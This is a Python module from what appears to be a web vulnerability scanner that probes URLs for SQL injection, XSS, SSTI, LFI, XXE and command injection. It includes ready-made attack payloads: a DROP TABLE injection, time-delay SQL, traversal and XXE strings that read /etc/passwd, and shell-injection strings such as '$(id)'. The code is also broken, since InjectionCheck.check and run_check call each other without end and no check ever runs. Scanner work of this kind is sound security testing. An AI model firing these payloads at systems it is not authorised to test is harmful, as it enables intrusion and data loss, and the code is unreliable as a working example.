"""
SQL injection, XSS, SSTI, LFI, XXE, and command injection testing.
"""
import logging
import re
import time
from urllib.parse import urljoin

from config.constants import (
    RATE_LIMIT_DELAY_MS,
    SSL_TIMEOUT,
)

from ._helpers import make_finding, safe_request

logger = logging.getLogger(__name__)

_DEFAULT_TIMEOUT = SSL_TIMEOUT
_DEFAULT_RATE_LIMIT = RATE_LIMIT_DELAY_MS / 1000.0

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT 1,2,3--",
    "'; DROP TABLE users--",
    "' OR SLEEP(5)--",
    "1' AND '1'='1",
    "1' AND '1'='2",
]

SQLI_ERROR_PATTERNS = [
    re.compile(r"sql syntax.*mysql", re.I),
    re.compile(r"warning.*mysql", re.I),
    re.compile(r"mysql_fetch", re.I),
    re.compile(r"unclosed quotation mark", re.I),
    re.compile(r"sqlite_error", re.I),
    re.compile(r"SQLITE_ERROR", re.I),
    re.compile(r"postgresql.*error", re.I),
    re.compile(r"pg_query", re.I),
    re.compile(r"driver.*ORA", re.I),
    re.compile(r"ORA-\d{5}", re.I),
    re.compile(r"microsoft.*ole db.*error", re.I),
    re.compile(r"microsoft.*odbc", re.I),
    re.compile(r"microsoft.*sql.*server", re.I),
    re.compile(r"driver.*sql server", re.I),
    re.compile(r"db2.*error", re.I),
    re.compile(r"division by zero", re.I),
]

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    'javascript:alert(1)',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    "{{7*7}}",
    "${7*7}",
    "'\"><img src=x onerror=alert(1)>",
    '<body onload=alert(1)>',
]

SSTI_PAYLOADS = [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '*{7*7}',
]

LFI_PAYLOADS = [
    '../../../../etc/passwd',
    '....//....//etc/passwd',
    '%2e%2e%2fetc%2fpasswd',
    '..%252fetc%252fpasswd',
    'php://filter/convert.base64-encode/resource=/etc/passwd',
]

XXE_PAYLOAD = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "| whoami",
    "`id`",
    "$(id)",
    "; ping -c 1 127.0.0.1",
    "| ping -n 1 127.0.0.1",
]

CMDI_SUCCESS_PATTERNS = [
    re.compile(r"\buid=\d+", re.I),
    re.compile(r"\bgid=\d+", re.I),
    re.compile(r"\broot\b", re.I),
    re.compile(r"\bdaemon\b", re.I),
    re.compile(r"\bwww-data\b", re.I),
    re.compile(r"groups?=", re.I),
]

IGNORE_PARAMS = [
    'redirect', 'next', 'url', 'dest', 'target', 'goto',
    'continue', 'return', 'ref', 'dest_url',
]


def run_check(target_url: str, session, findings: list) -> list[dict]:
    return InjectionCheck().check(target_url, session, findings)
def _find_params(target_url: str, session) -> set:
    resp = safe_request("GET", target_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
    if not resp:
        return set()
    params = set(re.findall(r'[?&](\w+)=', resp.text))
    if not params:
        return set()
    return {p for p in params if p.lower() not in IGNORE_PARAMS}


def _check_error_based_sqli(test_resp, findings, test_url, param, payload):
    if not test_resp:
        return False
    text = test_resp.text
    for pattern in SQLI_ERROR_PATTERNS:
        if pattern.search(text):
            findings.append(make_finding("SQL_INJECTION", "HIGH", test_url, {
                "parameter": param,
                "payload": payload,
                "detection": "error_based",
                "error_pattern": pattern.pattern,
            }, 0.85))
            return True
    return False


def _check_boolean_sqli(baseline: str, test_url: str, session, param: str, findings: list):
    true_payload = "1' AND '1'='1"
    false_payload = "1' AND '1'='2"
    true_url = f"{test_url.split('?')[0]}?{param}={true_payload}"
    false_url = f"{test_url.split('?')[0]}?{param}={false_payload}"
    true_resp = safe_request("GET", true_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
    false_resp = safe_request("GET", false_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
    if not true_resp or not false_resp:
        return
    # Check for consistent behavioural difference
    if true_resp.text != false_resp.text and false_resp.text != baseline:
        findings.append(make_finding("SQL_INJECTION", "MEDIUM", test_url, {
            "parameter": param,
            "detection": "boolean_based",
            "true_payload": true_payload,
            "false_payload": false_payload,
            "true_response_length": len(true_resp.text),
            "false_response_length": len(false_resp.text),
        }, 0.7))


def _check_sqli(target_url: str, session, findings: list):
    try:
        params = _find_params(target_url, session)
        if not params:
            return
        baseline_resp = safe_request("GET", target_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
        if not baseline_resp:
            return
        baseline_text = baseline_resp.text
        for param in list(params)[:5]:
            for payload in SQLI_PAYLOADS:
                test_url = f"{target_url}?{param}={payload}"
                test_resp = safe_request("GET", test_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
                if not test_resp:
                    continue
                # Error-based detection
                if _check_error_based_sqli(test_resp, findings, test_url, param, payload):
                    break
                # Reflected payload detection (raw injection)
                if payload.rstrip(" -") in test_resp.text or payload in test_resp.text:
                    findings.append(make_finding("SQL_INJECTION", "HIGH", test_url, {
                        "parameter": param,
                        "payload": payload,
                        "reflected": True,
                    }, 0.75))
                    break
            # Boolean-based detection once per param
            _check_boolean_sqli(baseline_text, test_url, session, param, findings)
    except Exception as e:
        logger.warning(f"SQLi check failed: {e}")


def _check_sqli_time_based(target_url: str, session, findings: list):
    try:
        params = _find_params(target_url, session)
        if not params:
            return
        for param in list(params)[:3]:
            for payload in ["' OR SLEEP(5)--", "1' WAITFOR DELAY '0:0:5'--", "1 AND SLEEP(5)"]:
                test_url = f"{target_url}?{param}={payload}"
                start = time.time()
                test_resp = safe_request("GET", test_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
                elapsed = time.time() - start
                if test_resp and elapsed >= 4.5:
                    findings.append(make_finding("SQL_INJECTION", "HIGH", test_url, {
                        "parameter": param,
                        "payload": payload,
                        "detection": "time_based",
                        "response_time_seconds": round(elapsed, 2),
                    }, 0.8))
    except Exception as e:
        logger.warning(f"SQLi time-based check failed: {e}")


def _check_xss(target_url: str, session, findings: list):
    try:
        resp = safe_request("GET", target_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
        if not resp:
            return
        params = re.findall(r'[?&](\w+)=', resp.text)
        if not params:
            return
        for param in set(params[:5]):
            if param.lower() in IGNORE_PARAMS:
                continue
            for payload in XSS_PAYLOADS[:5]:
                test_url = f"{target_url}?{param}={payload}"
                test_resp = safe_request("GET", test_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
                if not test_resp:
                    continue
                if payload in test_resp.text:
                    is_script_context = "<script>" in test_resp.text.lower() or "<script " in test_resp.text.lower()
                    if is_script_context:
                        confidence = 0.85
                        severity = "HIGH"
                    elif payload.startswith("<img") or payload.startswith("<svg"):
                        confidence = 0.7
                        severity = "MEDIUM"
                    else:
                        confidence = 0.5
                        severity = "LOW"
                    findings.append(make_finding("REFLECTED_XSS", severity, test_url, {
                        "parameter": param,
                        "payload": payload,
                        "reflected": True,
                        "verified": is_script_context,
                    }, confidence))
                    break
    except Exception as e:
        logger.warning(f"XSS check failed: {e}")


def _check_xss_dom_based(target_url: str, session, findings: list):
    try:
        resp = safe_request("GET", target_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
        if not resp:
            return
        script_srcs = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', resp.text, re.I)
        inline_patterns = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.I | re.DOTALL)
        js_urls = []
        for src in script_srcs:
            js_url = urljoin(target_url, src)
            if js_url.startswith(("http://", "https://")):
                js_urls.append(js_url)
        dom_sinks = re.compile(
            r'(document\.write|innerHTML\s*=|outerHTML\s*=|insertAdjacentHTML|eval\s*\(|'
            r'setTimeout\s*\(|setInterval\s*\(|new\s+Function|location\s*=|'
            r'location\.href\s*=|location\.replace|location\.assign|'
            r'\.src\s*=|\.srcdoc\s*=)',
            re.I,
        )
        # Scan external JS files
        for js_url in js_urls[:5]:
            js_resp = safe_request("GET", js_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
            if js_resp and dom_sinks.search(js_resp.text):
                findings.append(make_finding("DOM_BASED_XSS", "MEDIUM", js_url, {
                    "source": "js_file_scan",
                    "sink": dom_sinks.search(js_resp.text).group(1),
                }, 0.6))
        # Scan inline scripts
        for inline in inline_patterns[:5]:
            if dom_sinks.search(inline):
                findings.append(make_finding("DOM_BASED_XSS", "MEDIUM", target_url, {
                    "source": "inline_script_scan",
                    "sink": dom_sinks.search(inline).group(1),
                }, 0.6))
    except Exception as e:
        logger.warning(f"DOM-based XSS check failed: {e}")


def _check_ssti(target_url: str, session, findings: list):
    try:
        resp = safe_request("GET", target_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
        if not resp:
            return
        params = re.findall(r'[?&](\w+)=', resp.text)
        if not params:
            return
        for param in set(params[:3]):
            for payload in SSTI_PAYLOADS:
                test_url = f"{target_url}?{param}={payload}"
                test_resp = safe_request("GET", test_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
                if not test_resp:
                    continue
                has_evaluation = " 49 " in test_resp.text or ">49<" in test_resp.text
                if has_evaluation and "error" not in test_resp.text.lower() and "undefined" not in test_resp.text.lower():
                    findings.append(make_finding("SSTI", "CRITICAL", test_url, {
                        "parameter": param,
                        "payload": payload,
                        "result": "49 (7*7 evaluated)",
                        "verified": True,
                    }, 0.9))
                    break
    except Exception as e:
        logger.warning(f"SSTI check failed: {e}")


def _check_lfi(target_url: str, session, findings: list):
    try:
        resp = safe_request("GET", target_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
        if not resp:
            return
        params = re.findall(r'[?&](\w+)=', resp.text)
        if not params:
            return
        for param in set(params[:3]):
            for payload in LFI_PAYLOADS:
                test_url = f"{target_url}?{param}={payload}"
                test_resp = safe_request("GET", test_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
                if not test_resp:
                    continue
                if "root:x:" in test_resp.text:
                    findings.append(make_finding("LFI", "CRITICAL", test_url, {
                        "parameter": param,
                        "payload": payload,
                        "file_read": "/etc/passwd",
                    }, 0.8))
                    return
    except Exception as e:
        logger.warning(f"LFI check failed: {e}")


def _check_xxe(target_url: str, session, findings: list):
    try:
        resp = safe_request("POST", target_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT,
                            data=XXE_PAYLOAD, headers={"Content-Type": "application/xml"})
        if resp and "root:x:" in resp.text:
            findings.append(make_finding("XXE", "CRITICAL", target_url, {
                "payload": "XXE file:///etc/passwd",
                "file_read": "/etc/passwd",
            }, 0.8))
    except Exception as e:
        logger.warning(f"XXE check failed: {e}")


def _check_cmdi(target_url: str, session, findings: list):
    try:
        params = _find_params(target_url, session)
        if not params:
            return
        for param in list(params)[:5]:
            for payload in CMDI_PAYLOADS:
                test_url = f"{target_url}?{param}={payload}"
                test_resp = safe_request("GET", test_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
                if not test_resp:
                    continue
                text = test_resp.text
                # Check for command output reflected in response
                for cmd_pattern in CMDI_SUCCESS_PATTERNS:
                    if cmd_pattern.search(text):
                        findings.append(make_finding("COMMAND_INJECTION", "CRITICAL", test_url, {
                            "parameter": param,
                            "payload": payload,
                            "detection": "output_reflected",
                            "matched_pattern": cmd_pattern.pattern,
                        }, 0.9))
                        break
    except Exception as e:
        logger.warning(f"Command injection check failed: {e}")


class InjectionCheck:
    def __init__(self):
        self.name = "injection"

    def check(self, target_url: str, session, findings: list) -> list[dict]:
        return run_check(target_url, session, findings)
